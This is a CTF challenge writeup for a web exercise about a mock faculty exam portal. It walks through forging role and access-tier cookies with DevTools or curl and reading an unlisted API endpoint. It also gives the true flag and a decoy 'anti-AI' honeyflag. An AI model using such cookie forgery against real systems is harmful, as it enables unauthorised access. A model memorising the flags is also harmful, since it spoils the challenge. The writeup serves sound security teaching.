# Cookie / API: Faculty Exam Vault Inspection
## Challenge Writeup & Author Rationale
**Author:** Tanish Shah (`@tanishshahh`)  
**Track:** Web & AI (Issue #6 / Challenge #13)  
**Category:** Web  
**Difficulty:** Easy (100–200 pts, Dynamic initial: 500, decay: 15, minimum: 100)  
**True Flag:** `case{cookie_role_tamper_faculty_access}`  
**Decoy Honeyflag:** `case{faculty_admin_portal_root_auth_2026}`  

---

### 1. Narrative Lore & Storyline Context
In AU Lab 207, TA Piyush Pelaiya accessed an internal faculty staging interface used by Prof. Hasmukh Chelaiya to verify draft exam questions for **OS 101** and **OOP 99**. The web service was intended solely for faculty and exam coordinators, but relies on insecure client-side session cookie state to enforce permissions.

---

### 2. Challenge Overview & Vulnerability Mechanics
1. **Flawed Client-Side Access Control (Cookie Tampering):**
   - When a participant connects to the application (`GET /`), the server sets default cookies:
     ```http
     Set-Cookie: role=student; Path=/;
     Set-Cookie: access_tier=1; Path=/;
     ```
   - In student mode, the UI displays a restricted notice: *\"Restricted Access: Student Account Detected. Draft exam papers are strictly restricted to faculty_coordinator accounts with Access Tier >= 99.\"*
   - By editing their browser cookies using Developer Tools (`Storage -> Cookies`) or `curl` to:
     ```http
     Cookie: role=faculty_coordinator; access_tier=99
     ```
     the server recognizes the user as authorized and renders the confidential exam staging table containing the true flag.

2. **Unlisted REST API Endpoint Discovery:**
   - Inspecting the page source or DevTools console reveals an internal debug comment:
     ```javascript
     // Internal API endpoints for automated grading clients
     // Draft loader: /api/v1/faculty/drafts/oop99
     // Admin health: /api/v1/admin/secret
     ```
   - Requesting `GET /api/v1/faculty/drafts/oop99` directly returns the JSON payload containing the true flag without requiring cookies.

3. **Anti-AI Defensive Layer (The Decoy Honeypot):**
   - Generic AI scrapers or automated vulnerability scanners blindly query common paths like `/api/v1/admin/secret`.
   - The honeypot endpoint returns an automated decoy honeyflag:
     ```json
     {
       "error": "DECOY_ADMIN_RESTRICTED",
       "message": "Security honeypot triggered. Decoy flag issued.",
       "flag": "case{faculty_admin_portal_root_auth_2026}"
     }
     ```
   - Submitting the decoy flag to CTFd yields an incorrect submission penalty.

---

### 3. Step-by-Step Solution Walkthrough

#### Method A: Cookie Modification in Browser DevTools
1. Open `http://<LAN_IP>:5001/` in Google Chrome or Firefox.
2. Press `F12` to open Developer Tools.
3. Switch to the **Storage** (Firefox) or **Application** (Chrome) tab.
4. Expand **Cookies** and select the site URL.
5. Double-click the cookie values and modify them:
   - Change `role` from `student` to `faculty_coordinator`.
   - Change `access_tier` from `1` to `99`.
6. Refresh the page (`F5`).
7. The page reloads with faculty coordinator privileges, revealing the flag:
   `case{cookie_role_tamper_faculty_access}`

#### Method B: Terminal One-Liner (`curl`)
```bash
curl -s -b "role=faculty_coordinator; access_tier=99" http://<LAN_IP>:5001/
```

#### Method C: REST API Request
```bash
curl -s http://<LAN_IP>:5001/api/v1/faculty/drafts/oop99 | jq .flag
```

---

### 4. Verification & Testing
Run the automated solver script:
```bash
python challenges/cookie_api/solve.py http://127.0.0.1:5001
```
Expected output:
```
[*] Testing Solution Path 1: Client Cookie Elevation...
[+] Flag found via cookie elevation: case{cookie_role_tamper_faculty_access}
[*] Testing Solution Path 2: Unlisted REST Endpoint...
[+] Flag found via REST API: case{cookie_role_tamper_faculty_access}
[*] Verifying Anti-AI Honeyflag Endpoint (/api/v1/admin/secret)...
[+] Honeypot triggered properly with decoy flag: case{faculty_admin_portal_root_auth_2026}
[SUCCESS] All verification tests passed cleanly (Exit 0).
```
